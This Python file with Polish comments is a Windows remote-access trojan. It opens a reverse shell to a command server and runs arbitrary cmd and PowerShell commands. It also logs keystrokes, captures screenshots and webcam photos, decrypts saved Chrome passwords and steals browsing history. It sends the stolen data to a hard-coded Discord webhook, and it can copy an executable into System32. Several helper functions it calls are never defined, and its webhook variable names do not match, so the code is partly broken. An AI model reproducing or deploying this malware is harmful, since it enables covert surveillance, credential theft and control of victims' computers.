import subprocess
import platform
import os
import requests
import socket
import time
from PIL import ImageGrab
import io
import cv2
import psutil
import pprint
import ctypes
import pyautogui
import shutil
import sqlite3
import json
import keyboard
import threading 
import base64
from Cryptodome.Cipher import AES
import win32crypt 

# Host i port, do którego łączymy się z reverse shell
HOST = "192.168.1.12"
PORT = 4444
WEBHOOK_URL = "https://discord.com/api/webhooks/1211369168142868611/IEl0Wvx_Pz81Brkj0PGcymJXFBC5u7Y6U9BRNyA7pfqiFSGfJqFsD-dth_6HgQ73o7lK"


def send_data(sock, data):
    # Funkcja wysyłająca dane przez socket
    try:
        if isinstance(data, str):
            sock.send(data.encode())
        else:
            sock.sendall(data)
    except Exception as e:
        print("Błąd podczas wysyłania danych:", e)

def receive_data(sock):
    # Funkcja odbierająca dane przez socket
    try:
        data = sock.recv(1024)
        return data.decode()
    except Exception as e:
        print("Błąd podczas odbierania danych:", e)
        return ""

def get_nearby_networks():
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'network'], capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        print("Błąd podczas pobierania nazw sieci w pobliżu:", e)
        return "Błąd podczas pobierania nazw sieci w pobliżu."

def capture_screenshot_and_send_to_discord():
    # Funkcja do robienia zrzutu ekranu i wysyłania na webhook Discorda
    try:
        screenshot = ImageGrab.grab()
        img_stream = io.BytesIO()
        screenshot.save(img_stream, format='JPEG')
        img_stream.seek(0)
        
        # Wysyłanie pliku na webhook Discorda
        files = {'file': ('screenshot.jpg', img_stream)}
        response = requests.post(DISCORD_WEBHOOK_URL, files=files)
        
        if response.status_code == 200:
            return "Zrzut ekranu został wysłany na Discorda."
        else:
            return f"Błąd podczas wysyłania zrzutu ekranu na Discorda. Status code: {response.status_code}"
    
    except Exception as e:
        print("Błąd podczas robienia zrzutu ekranu i wysyłania na Discorda:", e)
        return "Błąd podczas robienia zrzutu ekranu i wysyłania na Discorda."
def disable_wifi():
    try:
        # Wyłączanie interfejsu WiFi za pomocą polecenia netsh
        subprocess.run(["netsh", "interface", "set", "interface", "Wi-Fi", "disabled"], check=True)
        print("WiFi zostało wyłączone.")
    except subprocess.CalledProcessError as e:
        print("Wystąpił błąd podczas wyłączania WiFi:", e)

def enable_wifi():
    try:
        subprocess.run(["netsh", "interface", "set", "interface", "Wi-Fi", "enable"], capture_output=True, text=True)
        return "WiFi zostało włączone."
    except Exception as e:
        return f"Błąd podczas włączania WiFi: {e}"
def take_photo_and_send_to_discord():
    # Funkcja do robienia zdjęcia z kamery i wysyłania na webhook Discorda
    try:
        # Utwórz obiekt kamery
        cap = cv2.VideoCapture(0)

        # Odczytaj obraz z kamery
        ret, frame = cap.read()

        # Zapisz zdjęcie na dysku
        cv2.imwrite("photo.jpg", frame)

        # Zamknij połączenie z kamerą
        cap.release()

        # Wysyłanie pliku na webhook Discorda
        files = {'file': open('photo.jpg', 'rb')}
        response = requests.post(DISCORD_WEBHOOK_URL, files=files)

        if response.status_code == 200:
            return "Zdjęcie zostało wysłane na Discorda."
        else:
            return f"Błąd podczas wysyłania zdjęcia na Discorda. Status code: {response.status_code}"
    
    except Exception as e:
        print("Błąd podczas robienia zdjęcia i wysyłania na Discorda:", e)
        return "Błąd podczas robienia zdjęcia i wysyłania na Discorda."

def send_running_processes_to_discord():
    try:
        running_processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            running_processes.append({'pid': proc.pid, 'name': proc.info['name']})

        if running_processes:
            data = {"content": "Lista uruchomionych procesów:", "embeds": []}
            for proc in running_processes:
                embed = {
                    "title": f"{proc['name']} (PID: {proc['pid']})"
                }
                data["embeds"].append(embed)

            headers = {"Content-Type": "application/json"}
            response = requests.post(DISCORD_WEBHOOK_URL, json=data, headers=headers)

            pprint.pprint(response.content)  # Dodane drukowanie treści odpowiedzi

            if response.status_code == 200:
                return "Lista uruchomionych procesów została wysłana na Discorda."
            else:
                return f"Błąd podczas wysyłania listy uruchomionych procesów na Discorda. Status code: {response.status_code}"
        else:
            return "Brak uruchomionych procesów do wyświetlenia."
    except Exception as e:
        return f"Błąd podczas pobierania i wysyłania listy procesów na Discorda: {str(e)}"

def get_system_info():
    # Funkcja do pobierania informacji o systemie
    try:
        system_info = platform.uname()
        return str(system_info)
    except Exception as e:
        print("Błąd podczas pobierania informacji o systemie:", e)
        return ""
def get_chrome_history():
    try:
        # Ścieżka do bazy danych historii przeglądarki Chrome na systemach Windows
        history_db_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default", "History")

        # Połączenie z bazą danych
        conn = sqlite3.connect(history_db_path)
        cursor = conn.cursor()

        # Wykonanie zapytania SQL
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")

        # Pobranie wyników zapytania
        chrome_history = cursor.fetchall()

        # Zamknięcie połączenia z bazą danych
        conn.close()

        return chrome_history
    except Exception as e:
        print("Błąd podczas pobierania historii przeglądarki Chrome:", e)
        return []
def save_chrome_history_to_file():
    try:
        chrome_history = get_chrome_history()
        if chrome_history:
            with open("chrome_history.txt", "w", encoding="utf-8") as file:
                for url, title, last_visit_time in chrome_history:
                    file.write(f"Title: {title}\nURL: {url}\nLast Visit Time: {last_visit_time}\n\n")
            return True
        else:
            return False
    except Exception as e:
        print("Błąd podczas zapisywania historii przeglądarki Chrome do pliku:", e)
        return False


key_buffer = []

# Funkcja do wysyłania danych na webhooka Discorda
def send_data_to_webhook(data):
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json={"content": data})
        if response.status_code == 200:
            print("Dane zostały wysłane na webhooka.")
        else:
            print(f"Błąd podczas wysyłania danych na webhooka. Status code: {response.status_code}")
    except Exception as e:
        print("Błąd podczas wysyłania danych na webhooka:", e)
def send_chrome_history_to_discord():
    try:
        if save_chrome_history_to_file():
            # Przygotowanie danych do wysłania na webhook Discorda
            files = {'file': open('chrome_history.txt', 'rb')}
            response = requests.post(DISCORD_WEBHOOK_URL, files=files)

            if response.status_code == 200:
                return "Historia przeglądarki Chrome została pomyślnie wysłana na Discorda."
            else:
                return f"Błąd podczas wysyłania historii przeglądarki Chrome na Discorda. Status code: {response.status_code}"
        else:
            return "Brak historii przeglądarki Chrome do wysłania."
    except Exception as e:
        print("Błąd podczas wysyłania historii przeglądarki Chrome na Discorda:", e)
        return "Błąd podczas wysyłania historii przeglądarki Chrome na Discorda."

# Funkcja wywoływana przy każdym zdarzeniu klawiatury
def on_key_event(event):
    key = event.name
    if len(key) == 1:
        key_buffer.append(key)
    else:
        key_buffer.append(f"[{key}]")

# Funkcja do przechwytywania klawiatury i wysyłania danych co jakiś czas
def keylogger():
    # Dodajemy nasłuchiwanie na zdarzenia klawiatury
    keyboard.on_press(on_key_event)
    
    while True:
        # Oczekiwanie przez określony czas
        time.sleep(10)  # Przykładowy czas oczekiwania, można dostosować
        
        # Jeśli w buforze są jakieś naciśnięte klawisze, to wysyłamy je na webhooka
        if key_buffer:
            send_data_to_webhook(" ".join(key_buffer))
            # Czyszczenie bufora
            key_buffer.clear()
def get_chrome_passwords():
    try:
        key = fetching_encryption_key() 
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", 
                               "Google", "Chrome", "User Data", "default", "Login Data") 
        filename = "ChromePasswords.db"
        shutil.copyfile(db_path, filename) 
          
        # connecting to the database 
        db = sqlite3.connect(filename) 
        cursor = db.cursor() 
          
        # 'logins' table has the data 
        cursor.execute( 
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used") 
        
        password_data = []
        # iterate over all rows 
        for row in cursor.fetchall(): 
            main_url = row[0] 
            login_page_url = row[1] 
            user_name = row[2] 
            decrypted_password = password_decryption(row[3], key) 
            date_of_creation = row[4] 
            last_usuage = row[5] 
              
            password_info = {
                "main_url": main_url,
                "login_page_url": login_page_url,
                "user_name": user_name,
                "decrypted_password": decrypted_password,
                "date_of_creation": date_of_creation,
                "last_usage": last_usuage
            }
            
            password_data.append(password_info)
        
        cursor.close() 
        db.close() 
        
        try: 
              
            # trying to remove the copied db file as  
            # well from local computer 
            os.remove(filename) 
        except: 
            pass
        
        return password_data
        
    except Exception as e:
        print("Błąd podczas pobierania haseł z przeglądarki Chrome:", e)
        return []


def fetching_encryption_key(): 
    # Local_computer_directory_path will look  
    # like this below 
    # C: => Users => <Your_Name> => AppData => 
    # Local => Google => Chrome => User Data => 
    # Local State 
    local_computer_directory_path = os.path.join( 
      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",  
      "User Data", "Local State") 
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f: 
        local_state_data = f.read() 
        local_state_data = json.loads(local_state_data) 
  
    # decoding the encryption key using base64 
    encryption_key = base64.b64decode( 
      local_state_data["os_crypt"]["encrypted_key"]) 
      
    # remove Windows Data Protection API (DPAPI) str 
    encryption_key = encryption_key[5:] 
      
    # return decrypted key 
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1] 
def press_win_l():
    try:
        # Symuluj naciśnięcie klawisza Windows + L
        time.sleep(1)
        pyautogui.hotkey('win', 'l')
        print("Naciśnięto kombinację klawiszy Win + L.")
    except Exception as e:
        print("Wystąpił błąd podczas naciśnięcia klawiszy Win + L:", e)
  
def password_decryption(password, encryption_key): 
    try: 
        iv = password[3:15] 
        password = password[15:] 
          
        # generate cipher 
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv) 
          
        # decrypt password 
        return cipher.decrypt(password)[:-16].decode() 
    except: 
          
        try: 
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]) 
        except: 
            return "No Passwords"


def main():
    # Tworzenie socketu i łączenie się z serwerem
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
    except Exception as e:
        print("Błąd podczas łączenia się z serwerem:", e)
        return

    while True:
        # Oczekiwanie na komendę od serwera
        command = receive_data(s)

        # Wykonywanie odpowiednich działań w zależności od komendy
        if command.startswith("cmd"):
            # Wykonaj komendę cmd
            command = command.replace("cmd ", "")
            result = execute_command(command)
            send_data(s, result)
        elif command == "powershell":
            # Wykonaj komendę powershell
            command = command.replace("powershell ", "")
            result = execute_command(["powershell", "-Command", command])
            send_data(s, result)
        elif command == "screenshoot":
            # Wykonaj zrzut ekranu i wyślij na Discorda
            response = capture_screenshot_and_send_to_discord()
            send_data(s, response)
        elif command == "diskinfo":
            # Pobierz informacje o dyskach
            disk_info = get_disk_info()
            send_data(s, disk_info)
        elif command == "sysinfo":
            # Pobierz informacje o systemie
            sys_info = get_system_info()
            send_data(s, sys_info)
        elif command.startswith("echo"):
            # Wyświetl komunikat echo
            message = command.replace("echo ", "")
            send_data(s, message)
        elif command == "txt":
            # Wykonaj polecenie echo, aby utworzyć plik tekstowy
            command = "echo TO TXT Z HOSTA > host.txt"
            execute_command(command)
            send_data(s, "Plik tekstowy 'host.txt' utworzony na hoście.")
        elif command == "currentpath":
            # Wyświetl obecną ścieżkę
            current_path = os.getcwd()
            send_data(s, current_path)
        elif command == "calculator":
            # Uruchom kalkulator (dla systemu Windows)
            if platform.system() == "Windows":
                os.system("calc")
                send_data(s, b"Kalkulator uruchomiony.")
            else:
                send_data(s, b"Calculator Error")
        elif command == "wejdzls":
            # Przejdź do określonej lokalizacji
            try:
                os.chdir(r"C:\Users\ilGaA\Desktop\LS")
                send_data(s, "Zmieniono bieżący katalog.")
            except Exception as e:
                send_data(s, "Błąd podczas zmiany katalogu: {}".format(e))
        elif command == "discord":
            # Uruchom Discord
            try:
                subprocess.run("start discord", shell=True)
                send_data(s, "Discord został uruchomiony.")
            except Exception as e:
                send_data(s, "Błąd podczas uruchamiania Discorda: {}".format(e))
        elif command == "dir":
            # Wyślij listę plików w bieżącym katalogu na Discorda
            files_list = list_files_in_current_directory()
            send_data(s, files_list)
        elif command == "kamerka":
            # Wykonaj zdjęcie z kamery i wyślij na Discorda
            response = take_photo_and_send_to_discord()
            send_data(s, response)
        elif command.strip() == "wpinfo":
            # Wykonaj skrypt wpinfo.py
            result = execute_command("python wpinfo.py")
            send_data(s, result)
        elif command.strip() == "launch":
            # Wykonaj skrypt wpinfo.py
            launch = execute_command("python launch.py")
            send_data(s, launch)
        elif command.strip() == "camera":
            # Wykonaj skrypt wpinfo.py
            result = execute_command("bash startcamera.bash")
            send_data(s, result)
        elif command.strip() == "system32":
            # Przejdź do katalogu System32
            os.chdir(os.path.join(os.environ["SystemRoot"], "System32"))
            send_data(s, b"System 32.")
        elif command.strip() == "main":
            # Skopiuj plik main.exe do katalogu System32
            if copy_file_to_system32("main.exe"):
                send_data(s, b"Udalo sie.")
            else:
                send_data(s, b"Error")
        elif command.strip() == "odpal main":
           # Uruchom main.exe z tego samego katalogu
            main_exe_path = os.path.join(os.getcwd(), "main.exe")
            result = execute_command(main_exe_path)
            send_data(s, result)
        elif command.strip() == "programy":
            programs_result = send_running_processes_to_discord()
            send_data(s, programs_result)
        elif command.strip() == "sieci":
            # Wyślij nazwy sieci w pobliżu
            networks = get_nearby_networks()
            send_data(s, networks)
        elif command.strip() == "chrome_history":
            # Wyślij historię przeglądarki Chrome na Discorda
            chrome_history_result = send_chrome_history_to_discord()
            send_data(s, chrome_history_result)
        if command.strip() == "keylogger":
            # Uruchomienie wątku dla keyloggera
            keylogger_thread = threading.Thread(target=keylogger)
            keylogger_thread.start()
            send_data(s, "Keylogger został uruchomiony.")
        if command == "hasla":
            chrome_passwords_result = get_chrome_passwords()
            send_data(s, json.dumps(chrome_passwords_result).encode())
        elif command.strip() == "disable_wifi":
            # Wyłącz WiFi
            result = disable_wifi()
            send_data(s, result)
        elif command.strip() == "enable_wifi":
            # Włącz WiFi
            result = enable_wifi()
            send_data(s, result)
        elif command.strip() == "kBJCiA":
            # Naciśnij kombinację klawiszy Win + L
            press_win_l()
            send_data(s, "Naciśnięto kombinację klawiszy Win + L.")

        if command.strip() == "exit":
            # Zamknij połączenie
            break
        else:
            print("Wrong Command!")

    s.close()

if __name__ == "__main__":
    main()